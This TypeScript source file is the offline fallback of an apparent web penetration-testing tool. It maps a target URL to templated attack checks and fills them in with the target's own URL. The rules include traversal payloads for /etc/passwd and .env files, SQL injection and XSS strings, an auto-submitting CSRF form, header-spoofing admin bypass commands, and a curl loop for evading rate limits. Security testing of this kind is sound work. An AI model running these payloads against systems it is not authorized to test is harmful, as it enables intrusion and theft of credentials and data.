import type { TargetContext } from "./parseTarget";

export interface FallbackPath {
  title: string;
  severity: "critical" | "high" | "medium" | "low";
  category: string;
  description: string;
  steps: string[];
  payload: string;
  impact: string;
}

/* ── Rule library ── */

const IDOR_PATHS: FallbackPath[] = [
  {
    title: "IDOR via Numeric ID Parameter",
    severity: "critical",
    category: "Broken Access Control",
    description: "Sequential numeric IDs in the URL allow an attacker to enumerate resources belonging to other users by incrementing or decrementing the ID value.",
    steps: ["Identify the numeric parameter", "Change the value to another user's ID (e.g. +1, -1)", "Check if the response contains another user's data", "Automate enumeration with Burp Intruder or ffuf"],
    payload: "GET {path}?{param}={value+1}",
    impact: "Full read access to other users' data, potential account takeover.",
  },
  {
    title: "Privilege Escalation via Object Reference",
    severity: "high",
    category: "Broken Access Control",
    description: "The application relies on client-supplied IDs for authorization. Replacing the ID with an admin or higher-privilege user's ID could grant elevated access.",
    steps: ["Authenticate as a low-privilege user", "Capture the request and note the ID parameter", "Replace with a known admin ID (e.g. 1 or 0)", "Observe if admin-level data or functionality is returned"],
    payload: "GET {path}?{param}=1",
    impact: "Admin-level access from a regular user account.",
  },
];

const API_PATHS: FallbackPath[] = [
  {
    title: "Rate Limiting Bypass on API Endpoint",
    severity: "medium",
    category: "Resource Exhaustion",
    description: "The API endpoint may lack rate limiting, allowing an attacker to brute-force or enumerate resources at scale.",
    steps: ["Send 100+ rapid requests to the endpoint", "Check if any are blocked or throttled", "Try rotating headers: X-Forwarded-For, X-Real-IP", "Test with different User-Agent strings"],
    payload: "for i in $(seq 1 100); do curl -s '{url}' -H 'X-Forwarded-For: 10.0.0.$i' & done",
    impact: "Credential stuffing, data enumeration, denial of service.",
  },
  {
    title: "Broken Authentication on API",
    severity: "high",
    category: "Authentication",
    description: "The API endpoint may be accessible without proper authentication tokens, or may accept expired/invalid tokens.",
    steps: ["Send the request without any Authorization header", "Send with an empty Bearer token", "Send with an expired or malformed JWT", "Check if data is still returned"],
    payload: "curl -v '{url}' -H 'Authorization: Bearer invalid' -H 'Authorization: '",
    impact: "Unauthorized access to protected API resources.",
  },
  {
    title: "API Versioning Exploit",
    severity: "medium",
    category: "Security Misconfiguration",
    description: "Older API versions may lack security patches. Testing /v1/ when /v2/ is current can reveal deprecated endpoints with weaker controls.",
    steps: ["Identify the current API version in the URL", "Replace with older versions: /v1/, /v0/", "Compare responses and available fields", "Look for fields removed in newer versions (passwords, tokens)"],
    payload: "GET {path_v1}",
    impact: "Access to deprecated endpoints with weaker security controls.",
  },
];

const FILE_PATHS: FallbackPath[] = [
  {
    title: "Local File Inclusion (LFI) via File Parameter",
    severity: "critical",
    category: "Path Traversal",
    description: "File-related parameters may allow path traversal to read arbitrary files from the server filesystem.",
    steps: ["Identify the file parameter", "Inject traversal sequence: ../../../etc/passwd", "Try URL-encoded variants: %2e%2e%2f", "Try null byte injection: %00", "Test double encoding: %252e%252e%252f"],
    payload: "GET {path}?{param}=../../../etc/passwd",
    impact: "Read sensitive server files including /etc/passwd, config files, source code.",
  },
  {
    title: "Path Traversal to Application Config",
    severity: "high",
    category: "Path Traversal",
    description: "Traversal may expose application configuration files containing database credentials, API keys, and secrets.",
    steps: ["Use traversal to reach common config paths", "Try: ../../.env, ../../config.php, ../../web.config", "Check for backup files: .env.bak, config.old", "Look for .git/config exposure"],
    payload: "GET {path}?{param}=../../.env",
    impact: "Exposure of database credentials, API keys, and internal configuration.",
  },
];

const SEARCH_PATHS: FallbackPath[] = [
  {
    title: "Reflected XSS via Search Parameter",
    severity: "high",
    category: "Cross-Site Scripting",
    description: "Search or query parameters may be reflected in the response without proper sanitization, enabling script injection.",
    steps: ["Enter a basic XSS probe in the search field", "Check if the input is reflected in the HTML response", "Try various encodings to bypass filters", "Test event handlers: onerror, onload, onfocus"],
    payload: "GET {path}?{param}=<script>alert(document.domain)</script>",
    impact: "Session hijacking, credential theft, phishing via injected content.",
  },
  {
    title: "SQL Injection in Search Query",
    severity: "critical",
    category: "Injection",
    description: "Search parameters may be directly interpolated into SQL queries, allowing database extraction or manipulation.",
    steps: ["Append a single quote to trigger SQL error: '", "Try boolean-based: ' OR '1'='1", "Try UNION-based: ' UNION SELECT null,username,password FROM users--", "Use time-based: ' OR SLEEP(5)--", "Automate with sqlmap"],
    payload: "GET {path}?{param}=' OR '1'='1' --",
    impact: "Full database extraction, authentication bypass, data manipulation.",
  },
  {
    title: "Server-Side Template Injection (SSTI)",
    severity: "high",
    category: "Injection",
    description: "If the search term is rendered through a server-side template engine, mathematical expressions may be evaluated.",
    steps: ["Inject template expression: {{7*7}}", "Check if 49 appears in the response", "Try other engines: ${7*7}, <%= 7*7 %>", "Escalate to RCE if confirmed"],
    payload: "GET {path}?{param}={{7*7}}",
    impact: "Remote code execution on the server.",
  },
];

const ADMIN_PATHS: FallbackPath[] = [
  {
    title: "Authentication Bypass on Admin Panel",
    severity: "critical",
    category: "Authentication Bypass",
    description: "Admin panels may have weak or misconfigured authentication, allowing access via forced browsing, default credentials, or header manipulation.",
    steps: ["Try accessing admin URLs directly without authentication", "Test default credentials: admin/admin, admin/password", "Add headers: X-Forwarded-For: 127.0.0.1", "Try HTTP verb tampering: change GET to POST"],
    payload: "curl -v '{url}' -H 'X-Forwarded-For: 127.0.0.1' -H 'X-Original-URL: /admin/dashboard'",
    impact: "Full administrative access to the application.",
  },
  {
    title: "Forced Browsing to Admin Routes",
    severity: "high",
    category: "Broken Access Control",
    description: "Hidden admin routes may be accessible by guessing common paths like /admin/users, /admin/config, /admin/backup.",
    steps: ["Enumerate common admin paths with ffuf or dirsearch", "Try: /admin/users, /admin/settings, /admin/logs", "Check for API admin routes: /api/admin/*", "Look for debug/config endpoints"],
    payload: "ffuf -u '{base}/admin/FUZZ' -w /usr/share/seclists/Discovery/Web-Content/common.txt",
    impact: "Discovery of hidden administrative functionality.",
  },
];

const GENERAL_PATHS: FallbackPath[] = [
  {
    title: "Missing Security Headers",
    severity: "low",
    category: "Security Misconfiguration",
    description: "The application may be missing critical security headers like X-Frame-Options, Content-Security-Policy, and Strict-Transport-Security.",
    steps: ["Inspect response headers with curl -I", "Check for X-Frame-Options (clickjacking)", "Check for CSP (XSS mitigation)", "Check for HSTS (downgrade attacks)"],
    payload: "curl -I '{url}'",
    impact: "Clickjacking, XSS exploitation, protocol downgrade attacks.",
  },
  {
    title: "Information Disclosure via Error Messages",
    severity: "medium",
    category: "Information Disclosure",
    description: "Sending malformed input may trigger verbose error messages revealing stack traces, database schemas, or internal paths.",
    steps: ["Send invalid parameter types (strings where numbers expected)", "Send extremely long values", "Send special characters: ', \", <, >, ;", "Check 404/500 error pages for server information"],
    payload: "GET {path}?{param}=AAAA' \" <> ;",
    impact: "Exposure of internal server details, database structure, and framework version.",
  },
  {
    title: "CSRF on State-Changing Actions",
    severity: "medium",
    category: "Cross-Site Request Forgery",
    description: "If the endpoint performs state changes and relies on cookie-based auth without CSRF tokens, an attacker can forge requests from a victim's browser.",
    steps: ["Check if the endpoint modifies data (POST/PUT/DELETE)", "Look for CSRF token in the request", "If missing, create a malicious HTML page with auto-submitting form", "Test if the action executes with only cookies"],
    payload: "<form action='{url}' method='POST'><input type='hidden' name='action' value='delete'/></form><script>document.forms[0].submit()</script>",
    impact: "Unauthorized actions performed on behalf of authenticated users.",
  },
  {
    title: "HTTP Method Tampering",
    severity: "medium",
    category: "Security Misconfiguration",
    description: "The server may respond differently to unexpected HTTP methods, potentially bypassing access controls.",
    steps: ["Send OPTIONS request to discover allowed methods", "Try PUT, DELETE, PATCH on GET-only endpoints", "Test X-HTTP-Method-Override header", "Check for TRACE method (XST attack)"],
    payload: "curl -X OPTIONS '{url}' -v\ncurl -X PUT '{url}' -d 'test=1'\ncurl '{url}' -H 'X-HTTP-Method-Override: DELETE'",
    impact: "Access control bypass, data modification, information disclosure.",
  },
];

/* ── Template interpolation ── */
function interpolate(template: string, ctx: TargetContext): string {
  const url = `${ctx.protocol || "https"}://${ctx.domain}${ctx.port ? `:${ctx.port}` : ""}${ctx.path}`;
  const paramEntries = Object.entries(ctx.queryParams);
  const firstParam = paramEntries[0];
  const numericParam = paramEntries.find(([, v]) => /^\d+$/.test(v));
  const fileParam = paramEntries.find(([k]) => /file|path|doc|page|template|include|src|img/i.test(k));
  const searchParam = paramEntries.find(([k]) => /search|q|query|keyword|s|term|find/i.test(k));
  const chosenParam = numericParam || fileParam || searchParam || firstParam;

  const base = `${ctx.protocol || "https"}://${ctx.domain}${ctx.port ? `:${ctx.port}` : ""}`;
  const pathV1 = ctx.path.replace(/\/v\d+\//i, "/v1/");

  return template
    .replace(/\{url\}/g, url + (paramEntries.length ? "?" + paramEntries.map(([k, v]) => `${k}=${v}`).join("&") : ""))
    .replace(/\{base\}/g, base)
    .replace(/\{path\}/g, ctx.path)
    .replace(/\{path_v1\}/g, pathV1)
    .replace(/\{param\}/g, chosenParam?.[0] || "id")
    .replace(/\{value\+1\}/g, chosenParam ? String(Number(chosenParam[1]) + 1 || "2") : "2");
}

/* ── Format a FallbackPath into markdown ── */
function formatPath(p: FallbackPath, idx: number, ctx: TargetContext): string {
  const lines = [
    `### ${idx}. ${p.title}`,
    "",
    `**Severity:** ${p.severity.charAt(0).toUpperCase() + p.severity.slice(1)}`,
    `**Category:** ${p.category}`,
    "",
    `**Description:** ${p.description}`,
    "",
    "**Steps to Test:**",
    ...p.steps.map((s, i) => `${i + 1}. ${s}`),
    "",
    "**Example Payload:**",
    "```",
    interpolate(p.payload, ctx),
    "```",
    "",
    `**Potential Impact:** ${p.impact}`,
  ];
  return lines.join("\n");
}

/* ══════════════════════════════════════════════
   Main fallback analyze function
   ══════════════════════════════════════════════ */
export function fallbackAnalyze(ctx: TargetContext): string {
  const matched: FallbackPath[] = [];
  const paramKeys = Object.keys(ctx.queryParams);
  const lowerPath = ctx.path.toLowerCase();

  // Rule: numeric IDs → IDOR + privilege escalation
  if (ctx.hasNumericIds) {
    matched.push(...IDOR_PATHS);
  }

  // Rule: /api/ segment → rate limiting, broken auth, versioning
  if (lowerPath.includes("/api/") || lowerPath.includes("/v1/") || lowerPath.includes("/v2/")) {
    matched.push(...API_PATHS);
  }

  // Rule: file-related params → LFI, path traversal
  const hasFileParam = paramKeys.some((k) => /file|path|doc|page|template|include|src|img/i.test(k));
  if (hasFileParam || ctx.fileExtensions.length > 0) {
    matched.push(...FILE_PATHS);
  }

  // Rule: search/query params → XSS, SQLi, SSTI
  const hasSearchParam = paramKeys.some((k) => /search|q|query|keyword|s|term|find/i.test(k));
  if (hasSearchParam) {
    matched.push(...SEARCH_PATHS);
  }

  // Rule: /admin/ → auth bypass, forced browsing
  if (lowerPath.includes("/admin")) {
    matched.push(...ADMIN_PATHS);
  }

  // Always include general paths for baseline coverage
  matched.push(...GENERAL_PATHS);

  // Deduplicate by title and cap at 12
  const seen = new Set<string>();
  const unique = matched.filter((p) => {
    if (seen.has(p.title)) return false;
    seen.add(p.title);
    return true;
  }).slice(0, 12);

  // Build markdown output
  const header = [
    `## Offline Analysis — ${ctx.domain || ctx.raw.slice(0, 40)}`,
    "",
    `**Path:** ${ctx.path || "/"}`,
    `**Parameters:** ${paramKeys.length > 0 ? paramKeys.join(", ") : "none"}`,
    `**Flags:** ${ctx.flags.length > 0 ? ctx.flags.join(", ") : "none"}`,
    "",
    `> ⚠️ This analysis was generated using rule-based pattern matching (offline mode). For deeper AI-powered analysis, ensure your Gemini API key is configured and you have internet connectivity.`,
    "",
    "---",
    "",
  ].join("\n");

  const body = unique.map((p, i) => formatPath(p, i + 1, ctx)).join("\n\n---\n\n");

  return header + body;
}
